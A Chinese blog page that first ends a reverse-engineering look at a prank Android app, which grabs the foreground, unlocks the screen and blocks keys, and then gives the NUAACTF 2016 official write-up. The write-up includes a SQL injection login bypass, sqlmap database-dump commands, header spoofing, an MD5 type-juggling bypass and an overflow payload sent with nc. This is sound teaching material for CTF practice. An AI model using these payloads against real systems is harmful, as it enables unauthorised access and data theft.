+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> 主窗口$按下某键(<span class="keyword">int</span> paramInt, BooleanReferenceParameter paramBooleanReferenceParameter) &#123;</span><br><span class="line">    <span class="keyword">boolean</span> bool = paramBooleanReferenceParameter.get();</span><br><span class="line">    <span class="keyword">if</span> (paramInt == <span class="number">24</span>) &#123;</span><br><span class="line">      bool = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramInt == <span class="number">25</span>) &#123;</span><br><span class="line">      bool = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramInt == <span class="number">82</span>) &#123;</span><br><span class="line">      bool = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    paramBooleanReferenceParameter.set(bool);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>两个音量控制键（24、25）、菜单键（82），大概是要屏蔽这三个按键吧。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> 时钟<span class="number">2</span>$周期事件() &#123;</span><br><span class="line">    <span class="keyword">this</span>.时钟<span class="number">1.</span>时钟周期(<span class="number">0</span>);</span><br><span class="line">    系统相关类.创建快捷方式<span class="number">2</span>(<span class="string">&quot;QQ悄悄话查看器0&quot;</span>, <span class="number">2130837504</span>, <span class="string">&quot;http://&quot;</span>);</span><br><span class="line">    系统相关类.创建快捷方式<span class="number">2</span>(<span class="string">&quot;QQ悄悄话查看器1&quot;</span>, <span class="number">2130837504</span>, <span class="string">&quot;http://&quot;</span>);</span><br><span class="line">    系统相关类.创建快捷方式<span class="number">2</span>(<span class="string">&quot;快手双击工具2&quot;</span>, <span class="number">2130837504</span>, <span class="string">&quot;http://&quot;</span>);</span><br><span class="line">    系统相关类.创建快捷方式<span class="number">2</span>(<span class="string">&quot;快手双击工具3&quot;</span>, <span class="number">2130837504</span>, <span class="string">&quot;http://&quot;</span>);</span><br><span class="line">    系统相关类.创建快捷方式<span class="number">2</span>(<span class="string">&quot;QQ悄悄话查看器4&quot;</span>, <span class="number">2130837504</span>, <span class="string">&quot;http://&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建一堆奇怪的快捷方式。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> 系统广播<span class="number">1</span>$收到广播(<span class="keyword">int</span> paramInt) &#123;</span><br><span class="line">    主窗口.标题(<span class="keyword">this</span>.系统广播<span class="number">1.</span>取广播内容());</span><br><span class="line">    <span class="keyword">if</span> (主窗口.标题().equals(<span class="string">&quot;1&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!应用操作.是否在前台()) &#123;</span><br><span class="line">            音量操作.置音量(<span class="number">4</span>, <span class="number">100</span>);</span><br><span class="line">            音量操作.置音量(<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">            音量操作.置音量(<span class="number">2</span>, <span class="number">100</span>);</span><br><span class="line">            音量操作.置音量(<span class="number">3</span>, <span class="number">100</span>);</span><br><span class="line">            应用操作.返回应用();</span><br><span class="line">            <span class="keyword">this</span>.系统设置<span class="number">1.</span>屏幕解锁();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>乍看起来像是保持前台运行的，如果被切到后台了，就强行跑到前台刷存在感（顺便如果你锁屏了人家还会帮你解个锁）。然而这个 <code>主窗口.标题().equals(&quot;1&quot;)</code> 的条件是个什么鬼？这个 class 没有什么可看的了，看最后的 <code>后台服务操作.class</code> 吧：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> 服务处理过程(String paramString) &#123;</span><br><span class="line">    <span class="keyword">boolean</span> bool = paramString.equals(<span class="string">&quot;闹钟&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (bool) &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            i = IntegerVariant.getIntegerVariant(i).add(ByteVariant.getByteVariant((<span class="keyword">byte</span>)<span class="number">1</span>)).getInteger();</span><br><span class="line">            系统相关类.发送广播(<span class="string">&quot;后台服务广播&quot;</span>, <span class="number">1</span>, 转换操作.整数到文本(i));</span><br><span class="line">            <span class="keyword">if</span> (IntegerVariant.getIntegerVariant(i).cmp(ByteVariant.getByteVariant((<span class="keyword">byte</span>)<span class="number">1</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">                i = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到发送广播的内容是 <code>1</code>，然后配上上面的 <code>主窗口.标题(this.系统广播1.取广播内容())</code>，这样就达到刷存在感的条件了。</p>
+<p><strong>翻完了所有的代码，没发现疑似病毒或者其它恶意软件的痕迹。大家如果对上面的图片或者音频感兴趣，可以放心地安装使用。</strong></p>
+<h1 id="0x02-Result"><a href="#0x02-Result" class="headerlink" title="0x02 Result"></a>0x02 Result</h1><p>所以，其实——</p>
+<blockquote>
+<p>这就是某个人顺手写出来的整人的玩意儿。</p>
+</blockquote>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/keng-die-ne.gif" alt="坑爹呢这是！"></p>
+<p>嗯，不光整了一个人，而是若干高校的图书馆、逸夫楼、自习室。</p>
+<p>好了，全文到此结束。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2016/06/17/fake-whisper-viewer/" data-id="clg6iymp7000oguoterya8m4a" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-nuaactf-2016-offical-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/04/26/nuaactf-2016-offical-writeup/" class="article-date">
+  <time datetime="2016-04-26T08:05:00.000Z" itemprop="datePublished">2016-04-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/04/26/nuaactf-2016-offical-writeup/">NUAACTF 2016 官方 Writeup</a>
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
+    <div class="article-author-info">
+      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
+      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><p>签到题，打开浏览器的Console即可找到flag：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/1.png" alt="0"></p>
+<p>下面那行带有中文的句子是我早上修改界面的时候加上去的，同样的彩蛋在网页源代码中也有，就是每个页面查看源代码之后显示的那个佛祖，23333。</p>
+<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><p>仔细看会发现题干中百度的链接有点奇怪：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/2.png" alt="0"></p>
+<p>根据题目提示，用百度搜索“一只苦逼的开发狗”，发现出题人的博客，第一篇文章有提示：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/3.png" alt="0"></p>
+<p>看起来是base64编码，解码之后查看文件类型：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;bnVhYWN0ZiU3Qi93ZWIyL2NlYmE2ZmJiZjBlZGU0MzI1MjY0MWNkMzM2ZTM2YTAzJTdE&quot;</span> | base64 -d &gt; out.dat</span><br><span class="line">$ file out.dat</span><br><span class="line">out.dat: ASCII text, with no line terminators</span><br><span class="line">$ cat out.dat</span><br><span class="line">nuaactf%7B/web2/ceba6fbbf0ede43252641cd336e36a03%7D</span><br></pre></td></tr></table></figure>
+
+<p>是一个URI编码之后的字符串，解码即可得到flag，也是下一题的地址：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/4.png" alt="0"></p>
+<h1 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h1><p>将题目网址的路径替换成Web2的flag，跳转到<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx:8080/web2/xedni.php%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%80%E6%AE%B5PHP%E4%BB%A3%E7%A0%81%EF%BC%9A">http://xxx.xxx.xxx.xxx:8080/web2/xedni.php，查看源代码之后发现了一段PHP代码：</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>]) &amp;&amp; md5(<span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>]) == <span class="string">&quot;0e731198061491163073197128363787&quot;</span>)</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;xedni.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们的目标就是反查md5。扔进cmd5中发现是一条付费记录，我没钱所以看不了。但是扔到百度中即可得到结果：s1184209335a。于是访问网址：</p>
+<p><a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx:8080/web2/xedni.php?password=s1184209335a">http://xxx.xxx.xxx.xxx:8080/web2/xedni.php?password=s1184209335a</a></p>
+<p>得到flag：nuaactf{/web3/b481b86354a413b898b6f01af539366d}。</p>
+<p>其实还有一种解法，因为PHP的一个“特性”：任何0e开头的字符串都会被解析为数字0，因此只需要找到任意一个md5之后0e开头的字符串，放进password参数中提交即可。看题目描述感觉本题应该是用此方法解，与出题人讨论之后，认为如果考此方法，代码中的md5判断改为”0e23333”更好一点。</p>
+<h1 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h1><p>将题目网址的路径替换成Web3的flag，跳转到<a target="_blank" rel="noopener" href="http://211.65.102.2:8080/web3/login.php%EF%BC%8C%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%8C%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E5%A4%9A%E4%BD%99%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%9B%A0%E6%AD%A4%E8%80%83%E8%99%91SQL%E6%B3%A8%E5%85%A5%E3%80%82%E6%B5%8B%E8%AF%95%E4%BA%86%E4%B8%80%E4%B8%8B%E5%8F%91%E7%8E%B0%E6%9C%89%E6%8A%A5%E9%94%99%EF%BC%8C%E4%BD%86%E6%98%AF%E6%8A%A5%E9%94%99%E4%B8%AD%E6%B2%A1%E6%9C%89%E8%AF%AD%E5%8F%A5%E7%9B%B8%E5%85%B3%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%8F%AA%E8%83%BD%E7%9B%B2%E6%B3%A8%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%B0%86%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AEdump%E5%87%BA%E6%9D%A5%EF%BC%8C%E5%B0%86%E8%8A%B1%E8%B4%B9%E5%BE%88%E9%95%BF%E7%9A%84%E6%97%B6%E9%97%B4%E3%80%82%E6%A0%B9%E6%8D%AE%E6%8F%90%E7%A4%BA%E2%80%9C%E9%9C%80%E8%A6%81%E7%94%A8%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E6%9D%A5%E7%9C%8Bflag%E2%80%9D%EF%BC%8C%E4%BA%8E%E6%98%AF%E7%8C%9C%E6%83%B3%E7%94%A8%E6%88%B7%E8%A1%A8%E4%B8%AD%E6%9C%89%E4%B8%80%E5%88%97%E6%A0%87%E8%AE%B0%E6%98%AF%E5%90%A6%E4%B8%BAadmin%E3%80%82%E7%9B%B4%E6%8E%A5%E5%9C%A8%E7%94%A8%E6%88%B7%E5%90%8D%E4%B8%AD%E8%BE%93%E5%85%A5%E3%80%90&#39;">http://211.65.102.2:8080/web3/login.php，这是一个登录界面，没有任何多余信息，因此考虑SQL注入。测试了一下发现有报错，但是报错中没有语句相关的信息，因此只能盲注，如果将数据库中的数据dump出来，将花费很长的时间。根据提示“需要用管理员账号来看flag”，于是猜想用户表中有一列标记是否为admin。直接在用户名中输入【&#39;</a> and 1=0 union select 1,1,1,1 – 】（别忘了一开始的单引号和最后的空格，1的数量是从两个开始试出来的，表示用户表一共有4列），提交之后会跳转，通过抓包看到flag：nuaactf{hApPy_haCk1n9_t0Day}，以及下一题的地址。</p>
+<p>为了验证猜想是否正确，可以使用sqlmap扫一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./sqlmap.py -u <span class="string">&quot;http://xxx.xxx.xxx.xxx:8080/web3/login.php&quot;</span> --forms –dbs</span><br><span class="line">available databases [2]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] nuaactf</span><br></pre></td></tr></table></figure>
+
+<p>然后看一下nuaactf里面有什么信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./sqlmap.py -u <span class="string">&quot;http://xxx.xxx.xxx.xxx:8080/web3/login.php&quot;</span> --forms -D nuaactf --tables --dump</span><br></pre></td></tr></table></figure>
+
+<p>可以dump出表结构，如下图所示：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/5.png" alt="0"></p>
+<p>证实了刚才的猜想。</p>
+<h1 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h1><p>根据题目描述“你从哪里来“，可以推测是修改HTTP头。在HTTP头中加上：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Origin</span>: http://cs.nuaa.edu.cn/</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 【cs.nuaa.edu.cn的IP】</span><br></pre></td></tr></table></figure>
+
+<p>得出flag：nuaactf{C0ndrulation!&#95;y0u&#95;f1n1shed_a11_web_quest}。</p>
+<h1 id="Reverse1"><a href="#Reverse1" class="headerlink" title="Reverse1"></a>Reverse1</h1><p>这是一个apk，先用dex2jar将其转换为jar文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ d2j-dex2jar.sh reverse1.apk</span><br><span class="line">dex2jar reverse1.apk -&gt; reverse1-dex2jar.jar</span><br></pre></td></tr></table></figure>
+
+<p>用jd-gui打开，在cc.sslab.app1中发现flag：nuaactf{Happy_crack1ng_app!}。</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/6.png" alt="0"></p>
+<h1 id="Reverse2"><a href="#Reverse2" class="headerlink" title="Reverse2"></a>Reverse2</h1><p>根据题目描述，可能跟音频有关，于是用压缩工具打开apk（apk本质上是个压缩包），在res/raw文件夹中发现sound.wav。使用高级一点的音频工具（例如AU）打开，发现有四个声道，下面的两个声道非常可疑。</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/7.png" alt="0"></p>
+<p>于是就变成了一道数数题，令上面的为1，下面的为0，得到如下的01序列：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011011100111010101100001011000010110001101110100011001100111101101110011011010000011000001110010011101000101111101100110001100010100000101100111</span><br></pre></td></tr></table></figure>
+
+<p>然后将其每8个一组，转换为ASCII字符：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;01101110 01110101 01100001 01100001 01100011 01110100 01100110 01111011 01110011 01101000 00110000 01110010 01110100 01011111 01100110 00110001 01000001 01100111&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line">a.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">    ascii = <span class="built_in">parseInt</span>(item, <span class="number">2</span>)</span><br><span class="line">    b += <span class="built_in">String</span>.fromCharCode(ascii)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(b)</span><br></pre></td></tr></table></figure>
+
+<p>得出flag：nuaactf{sh0rt_f1Ag}。（原数据缺少右花括号，比赛现场修正了题目。）</p>
+<h1 id="Reverse3"><a href="#Reverse3" class="headerlink" title="Reverse3"></a>Reverse3</h1><p>根据题目描述（拖拽即可生成界面）以及exe文件打开之后的窗口图标，可以确定这是一个.NET的程序。使用ILSpy（或者.NET Reflector）打开，在reverse3的Form1中发现：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/8.png" alt="0"></p>
+<p>分析可得：点击按钮之后判断你输入的字符串经过decrypt2加密后是否等于通过decrypt1解密过的一串字符串，如果相等则显示“Correct Flag!”。也就是说，flag应该是图中的长字符串经过decrypt1解密后再经过decrypt2解密得到的答案。</p>
+<p>在reverse3中有decrypt1和decrypt2两个class，里面都有加密和解密函数（据出题人说，为了降低难度特地写的解密函数，本应由参赛者自行推断解密算法）。扔进C#环境中运行一遍即可。</p>
+<p>由于我本机没有C# 环境，因此搜索出来一个支持多种语言的在线运行环境。将decrypt1、decrypt2、MyMap三个类摘出来拼到一个文件中，自己另写了一个Test类来调用。</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/9.png" alt="0"></p>
+<p>上图是我在Sublime Text中整合的代码，为了方便截图我将三个类折叠起来了。 下图是在一个在线运行网站上得出的结果。</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/10.png" alt="0"></p>
+<p>最终得出flag：NUAACTF{HAPPYCRACK1NGCHHARP}。</p>
+<h1 id="Reverse4"><a href="#Reverse4" class="headerlink" title="Reverse4"></a>Reverse4</h1><p>这是一个Mac下的二进制文件，使用IDA打开，看到 _main函数的逻辑是：获取程序调用时的第一个参数（argv1），使用encrypt函数加密之后输出。</p>
+<p>于是找到encrypt函数，不得不说IDA的变量改名和注释功能挺好用的，一番折腾之后见下图。其中关于&#95;DefaultRuneLocale&#95;ptr和 __maskrune的知识，请参考下面的两个文件：</p>
+<p><a target="_blank" rel="noopener" href="http://users.sosdg.org/~qiyong/mxr/source/lib/libc/locale/runetable.c#L54">http://users.sosdg.org/~qiyong/mxr/source/lib/libc/locale/runetable.c#L54</a> <a target="_blank" rel="noopener" href="http://users.sosdg.org/~qiyong/mxr/source/lib/libc/locale/runetype_file.h#L60">http://users.sosdg.org/~qiyong/mxr/source/lib/libc/locale/runetype_file.h#L60</a></p>
+<p>这也是编译器实现isalpha和isupper等函数的原理。</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/11.png" alt="0"></p>
+<p>可能是IDA的F5工具逻辑有问题，将一个循环编译成的汇编还原成伪代码的结果很奇怪。再进行一遍逻辑整理之后，推测出源代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">char</span> *buffer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> str_length = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">int</span> password_length = <span class="built_in">strlen</span>(password);</span><br><span class="line">    <span class="comment">// 生成密码字典dict</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; password_length; i++) &#123;</span><br><span class="line">        alphabet[password[i] - <span class="string">&#x27;a&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        dict[i] = password[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++)</span><br><span class="line">        <span class="keyword">if</span> (alphabet[i] == <span class="literal">false</span>)</span><br><span class="line">            dict[password_length++] = i;</span><br><span class="line">    <span class="comment">// 使用dict来置换对str中的字母</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str_length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isalpha</span>(str[i]) == <span class="literal">true</span>) &#123;</span><br><span class="line">            t = <span class="built_in">tolower</span>(str[i]) - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            c = str[i];</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isupper</span>(c) == <span class="literal">false</span>) buffer[i] = dict[t] + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="keyword">else</span> buffer[i] = dict[t] + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> buffer[i] = t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，上方生成的字典其实就是a-z的字母表，将password放到开头，然后剩下的字母依次排列。下方的替换其实就是str[i]→dict[str[i]]，也就是说，这是一个用password做表头的标准字头密码体制。至于password是什么，用IDA全局搜索一下就知道了：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/12.png" alt="0"></p>
+<p>可以看到password的值为”asuri”，那么密码表就是”asuribcdefghjklmnopqtvwxyz”，写程序也好，手动替换也好，可以得出加密串ktaauqb{Apto1_Mo0qiuq_Y0t} 的原串，也就是题目的flag为：nuaactf{Asur1_Pr0tect_Y0u}。</p>
+<p>顺便提一下：我在IDA中看到有一个函数叫generateDict，但是在main中并没有被调用，与出题人核对一遍源代码之后才发现，源代码在encrypt函数中调用了generateDict，然而编译器将它inline优化掉了，因此encrypt中才有了生成字典的代码段。</p>
+<h1 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h1><p>打开链接发现是一个txt文件，可以断定用了jsfuck，因此将代码复制粘贴到浏览器中执行即可得到flag：nuaactf{Isnt_js_FunNy&gt;?}。</p>
+<h1 id="Pwn2"><a href="#Pwn2" class="headerlink" title="Pwn2"></a>Pwn2</h1><p>裸最短路问题，可以使用Dijkstra或者SPFA来解决。最终得到flag：nuaactf{1159}。</p>
+<h1 id="Pwn3"><a href="#Pwn3" class="headerlink" title="Pwn3"></a>Pwn3</h1><p>下载下来一个Linux下的ELF文件，直接用Linux环境执行会输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cannot find flag files!,use default flag: nuaactf&#123;FLAG_w0nt_b1_s0_EASY&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个flag是一个假的flag，因此需要继续破解。扔到IDA中F5一下，然后定位到main函数，发现先在本地读取了flag.txt，如果没有的话输出上面那段话，因此只能通过nc连过去之后输入，或者在本机先输出，然后通过管道接到nc里面。</p>
+<p>剩下的绝大部分代码都是连接socket的，只有最后一段：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/13.png" alt="0"></p>
+<p>于是找到str_echo函数，发现并未读取v7，然而判断了v7是否等于0x800，因此可以确定有缓冲区溢出漏洞。找到result = read(a1, &amp;s, 500uLL)，那么漏洞应该在这里。到上面查看s和v7的位置吧，如下图所示，s的起点在sp+10h，v7的起点在sp+124h，说明需要读入114h个8的长度（因为sizeof(char)=8）才可以开始读v7。</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/14.png" alt="0"></p>
+<p>那么方法就是构造这样一个二进制串：一开始是长度为114h*8（2208位二进制）的随机串，最后补上一个0x800的二进制串就可以了。如果使用WinHex或者Sublime Text查看这个串，应该是先有552个0，之后接了0008（大端模式）。将这个文件存成一个二进制文件例如a.dat，然后在命令行中输入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat a.dat | ./nc.exe xxx.xxx.xxx.xxx 43321</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：nuaactf{explo1t_a_l0t_fun}。</p>
+<h1 id="Pwn4"><a href="#Pwn4" class="headerlink" title="Pwn4"></a>Pwn4</h1><p>模拟题，读入矩阵并按照题目描述来操作。最后求行和与列和的输出一共24个数字，根据提示说最终答案是一个长度为24的字符串，考虑到这些数字对127取余后可能就是flag。最终得到结果：nuaactf{M4tr1X_15_gRe4t}。</p>
+<h1 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h1><p>使用file命令查看文件类型：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file misc1.rar</span><br><span class="line">misc1.rar: PNG image data, 454 x 340, 8-bit/color RGBA, non-interlaced</span><br></pre></td></tr></table></figure>
+
+<p>发现是一个PNG文件。修改后缀打开得到flag：nuaactf{Hello_MISC_nOt_RAR}。</p>
+<h1 id="Misc2"><a href="#Misc2" class="headerlink" title="Misc2"></a>Misc2</h1><p>使用binwalk命令查看文件数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk misc2.png</span><br><span class="line"></span><br><span class="line">DECIMAL HEXADECIMAL DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0       0x0         PNG image, 512 x 512, 8-bit/color RGBA, non-interlaced</span><br><span class="line">85      0x55        Zlib compressed data, best compression</span><br><span class="line">2773    0xAD5       Zlib compressed data, best compression</span><br><span class="line">195124  0x2FA34     Zip archive data, at least v1.0 to extract, compressed size: 28, uncompressed size: 28, name: flag.txt</span><br><span class="line">195244 